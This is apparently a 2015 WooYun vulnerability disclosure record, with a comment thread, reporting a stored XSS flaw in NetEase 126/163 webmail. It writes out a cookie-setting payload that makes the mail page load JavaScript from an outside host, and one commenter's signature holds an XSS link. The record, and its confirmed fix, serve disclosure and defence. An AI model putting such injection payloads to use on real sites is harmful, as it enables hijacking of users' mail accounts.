{"id": 45616, "wybug_id": "wooyun-2015-0127985", "wybug_title": "【乌云峰会】网易邮箱XSS ROOKIT", "wybug_corp": "网易", "wybug_author": "多多关照", "wybug_date": "2015-07-21 00:41", "wybug_open_date": "2015-09-08 10:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向公众公开  简要描述： 163、126均存在此问题。 详细说明：  网易邮箱会将cookie中的mail_idc在源代码中输出，例如，我们在控制台下输入：document.cookie=\"mail_idc=//xsst.sinaapp.com/poc/mail_idc.js#; path=/; domain=126.com; max-age=9999999\";然后登录126邮箱，看源代码，会发现以下内容,build:'6.0b1507151536',now:1437401206072,rootPath:\"http:////xsst.sinaapp.com/poc/mail_idc.js#/p/js6/\",cacheRootPath:\"http:////xsst.sinaapp.com/poc/mail_idc.js#/p/js6/6.0b1507151536/\",cacheJsPath:\"http:////xsst.sinaapp.com/poc/mail_idc.js#/p/js6/6.0b1507151536/js/\",cacheCssPath:\"http:////xsst.sinaapp.com/poc/mail_idc.js#/p/js6/6.0b1507151536/css/\",cacheImgPath:\"http:////xsst.sinaapp.com/poc/mail_idc.js#/p/js6/6.0b1507151536/img/\",而cacheJsPath这些变量将会被当作外部JS调用，所以导致加载任意外部JS。\n\n至于如何设置126.com下的cookie，只要找到一个126.com域下的XSS即可。（这里我就不卖这个XSS了，毕竟这种126.com域下的XSS少一个多一个区别不大，留着以后做演示）   漏洞证明：  见详细说明   修复方案：  无   版权声明：转载请注明来源 多多关照@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-25 10:56 厂商回复： 漏洞已修复，并对类似问题进行排查，感谢您对网易的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-21 00:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:134        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  原来是你    \n     2015-07-21 00:57 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:74        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  原来是你    \n     2015-07-21 01:35 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  原来是你    \n     2015-07-21 02:07 |    \t\t杯水 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  原来是你    \n     2015-07-21 03:00 |    \t\t抚琴听海 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 交流qq  752247101)\t\t \n  原来是你    \n     2015-07-21 03:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  原来是你    \n     2015-07-21 04:55 |    \t\tLet a person cry. \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:2        | xxoo)\t\t \n  原来是你    \n     2015-07-21 05:52 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:125        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  原来是你⊙﹏⊙    \n     2015-07-21 08:16 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:15        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  不是香草么？    \n     2015-07-21 08:22 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:15        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  我其实想看毕姥姥（毕月乌）的那东西@毕月乌....    \n     2015-07-21 09:31 |    \t\tWulala \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:24        | ^..^ ^..^ ^↓^ ^..^ ^..^)\t\t \n  终于出来了啊    \n     2015-07-21 09:38 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  原来是你    \n     2015-07-21 09:38 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:55        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  原来是你    \n     2015-07-21 09:38 |    \t\t冰火九天 \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:36        | 游走在黑与白的边缘)\t\t \n  原来是你    \n     2015-07-21 09:39 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  是你是你就是你    \n     2015-07-21 09:41 |    \t\t甲鱼 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:3        | 慢慢爬……)\t\t \n  是你是你就是你    \n     2015-07-21 09:52 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:42        | Newbie)\t\t \n  幕后黑手    \n     2015-07-21 09:55 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:78        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  原来是你     \n     2015-07-21 10:00 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:75        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  是我^^^你能把我怎么样^^^^哼哼    \n     2015-07-21 10:13 |    \t\t‮ \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:4        | -->‮)\t\t \n  执法队已在路上    \n     2015-07-21 10:17 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:75        | 硬件与无线通信研究方向)\t\t \n  原来是你    \n     2015-07-21 10:32 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:75        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  @‮ 好恶心   打出来的字是反的  你还弄个空白名    \n     2015-07-21 10:44 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:13        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  坐等躺枪    \n     2015-07-21 11:22 |    \t\tprint_0x0000 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:22        | 一枚苦逼的农民工.)\t\t \n  原来是你    \n     2015-07-21 12:03 |    \t\t骸骸 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        )\t\t \n  原来是你    \n     2015-07-21 12:07 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:37        | I'm Me_Fortune)\t\t \n  是他是他就是他，我们的好朋友小哪吒    \n     2015-07-21 12:28 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:15        )\t\t \n  原来是你    \n     2015-07-21 12:43 |    \t\t泪雨无魂 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:21        )\t\t \n  原来是你     \n     2015-07-21 12:56 |    \t\tcmxz \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:2        | )\t\t \n  置顶了？    \n     2015-07-21 13:01 |    \t\tCzzzzzzz \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | o.0)\t\t \n  原来是你    \n     2015-07-21 13:07 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  不是我，哈哈    \n     2015-07-21 13:29 |    \t\tSunnyDoll \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:10        | 职业搬砖工)\t\t \n  原来是你    \n     2015-07-21 14:46 |    \t\tmikecracker \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | none of my business)\t\t \n  原来是你    \n     2015-07-21 15:22 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        )\t\t \n  原来是你    \n     2015-07-21 15:31 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:373        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  原来是你    \n     2015-07-21 15:43 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n      \n     2015-07-25 11:44 |    \t\t泪雨无魂 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:21        )\t\t \n  原来是你     \n     2015-07-25 11:54 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 每日必关注乌云)\t\t \n  大片，后排出售3D眼镜。    \n     2015-07-26 00:38 |    \t\tCn-Wolf \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 这个人很懒，什么都没有留下！)\t\t \n  原来是你    \n     2015-09-08 11:19 |    \t\thaker_t \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | 那个什么。。那个。。)\t\t \n  原来是你    \n     2015-09-08 12:19 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 学姿势，学思路。)\t\t \n  留着做演示    \n     2015-09-08 13:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  额，第一次的访问的就是反射型XSS去修改cookie额。。。。    \n     2015-09-09 09:21 |    \t\t路人毛 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 昨晚做梦，挖到了电信都漏洞，被电信起诉了...)\t\t \n  666    \n     2015-09-09 09:30 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 每日必关注乌云)\t\t \n  我也留着以后做演示，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}